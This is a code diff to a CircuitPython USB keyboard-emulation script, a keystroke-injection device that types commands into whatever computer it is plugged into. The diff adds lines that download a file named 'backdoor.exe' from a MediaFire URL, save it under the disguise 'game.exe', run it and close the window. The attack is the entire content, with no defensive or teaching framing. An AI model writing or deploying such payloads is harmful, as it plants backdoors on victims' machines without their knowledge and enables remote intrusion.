@@ -1,6 +1,5 @@
 import time
 import usb_hid
-from adafruit_hid.mouse import Mouse
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 from adafruit_hid.keycode import Keycode
@@ -22,13 +21,9 @@ while S < 2:
     keyboard.press(Keycode.ENTER)
     keyboard.release_all()
     time.sleep(1)
-    keyboard_layout.write("curl 'url' --output game.exe")
-    keyboard.press(Keycode.ENTER)
-    keyboard.release_all()
-    
-    time.sleep(5)
-    while a < 4:
-        keyboard_layout.write("start game.exe")
-        keyboard.press(Keycode.ENTER)
-        keyboard.release_all()
+    keyboard_layout.write("curl https://download1645.mediafire.com/k6q51h8cz1dg/rfgtmorlhf5tc6z/backdoor.exe --output game.exe\n")
+    keyboard_layout.write("game.exe\n")
+    keyboard_layout.write("exit\n")
     S = S+1
+
+
